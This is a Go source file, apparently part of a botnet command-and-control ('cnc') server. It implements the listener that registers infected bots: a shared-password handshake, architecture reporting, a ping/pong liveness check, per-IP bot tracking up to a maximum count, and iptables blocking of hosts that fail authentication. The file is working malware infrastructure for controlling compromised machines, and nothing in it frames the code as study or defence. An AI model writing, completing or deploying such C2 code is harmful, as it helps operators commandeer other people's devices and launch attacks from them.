package bot

import (
	"bufio"
	"cnc/internal/logger"
	"cnc/internal/models"
	"cnc/internal/state"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
	"unsafe"
)

func BotListener(port int) {
	listenAddr := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		fmt.Printf("failed to bind bot listener on port %d: %v\n", port, err)
		os.Exit(1)
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]

		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		handBuf := make([]byte, 256)
		n, err := conn.Read(handBuf)
		if err != nil {
			conn.Close()
			continue
		}
		conn.SetReadDeadline(time.Time{})

		handStr := strings.TrimSpace(string(handBuf[:n]))
		fields := strings.Fields(handStr)
		if len(fields) < 2 {
			conn.Close()
			continue
		}
		arch := fields[0]
		passwd := fields[1]

		if passwd != state.Password {
			fmt.Printf("authentication failed from %s (arch=%s)\n", remoteIP, arch)
			exec.Command("iptables", "-A", "INPUT", "-s", remoteIP, "-j", "DROP").Run()
			conn.Close()
			continue
		}

		state.BotMutex.Lock()
		foundDuplicate := false
		for i := 0; i < state.BotCount; i++ {
			if state.Bots[i].IsValid && state.Bots[i].Ip == remoteIP && state.Bots[i].Arch == arch {
				foundDuplicate = true
				break
			}
		}

		if foundDuplicate || state.BotCount >= models.MAX_BOTS {
			state.BotMutex.Unlock()
			conn.Close()
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write([]byte("ping"))
		conn.SetWriteDeadline(time.Time{})
		if err != nil {
			state.BotMutex.Unlock()
			conn.Close()
			continue
		}

		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		pongBuf := make([]byte, 64)
		n, err = conn.Read(pongBuf)
		conn.SetReadDeadline(time.Time{})
		if err != nil || !strings.HasPrefix(string(pongBuf[:n]), "pong ") {
			state.BotMutex.Unlock()
			conn.Close()
			continue
		}

		realArch := strings.TrimSpace(string(pongBuf[5:n]))

		state.Bots[state.BotCount] = models.Bot{
			Conn:    conn,
			IsValid: true,
			Arch:    realArch,
			Ip:      remoteIP,
		}

		endian := getEndianness()
		logger.LogBotJoin(endian, realArch, remoteIP)

		go handleBot(&state.Bots[state.BotCount])
		state.BotCount++

		state.BotMutex.Unlock()
	}
}

func handleBot(bot *models.Bot) {
	botIP := bot.Ip
	botArch := bot.Arch

	defer func() {
		state.BotMutex.Lock()
		bot.IsValid = false
		bot.Conn.Close()
		state.BotMutex.Unlock()

		logger.LogBotDisconnect("EOF", botArch, botIP)
	}()

	reader := bufio.NewReader(bot.Conn)
	for {
		bot.Conn.SetReadDeadline(time.Now().Add(45 * time.Second))
		_, err := reader.ReadString('\n')
		if err != nil {
			cause := "EOF"
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				cause = "Timeout"
			} else if err != io.EOF {
				cause = err.Error()
			}
			logger.LogBotDisconnect(cause, botArch, botIP)
			return
		}
	}
}

func cleanupBots() {
	state.BotMutex.Lock()
	defer state.BotMutex.Unlock()

	newCount := 0
	for i := 0; i < state.BotCount; i++ {
		if state.Bots[i].IsValid {
			state.Bots[newCount] = state.Bots[i]
			newCount++
		}
	}
	state.BotCount = newCount
}

func PingBots() {
	for {
		time.Sleep(20 * time.Second)
		cleanupBots()

		state.BotMutex.Lock()
		for i := 0; i < state.BotCount; i++ {
			if !state.Bots[i].IsValid {
				continue
			}
			_, err := state.Bots[i].Conn.Write([]byte("ping"))
			if err != nil {
				state.Bots[i].IsValid = false
				state.Bots[i].Conn.Close()
			}
		}
		state.BotMutex.Unlock()
	}
}

func getEndianness() string {
	var i uint32 = 0x12345678
	b := (*[4]byte)(unsafe.Pointer(&i))
	if b[0] == 0x78 {
		return "Little_Endian"
	}
	return "Big_Endian"
}
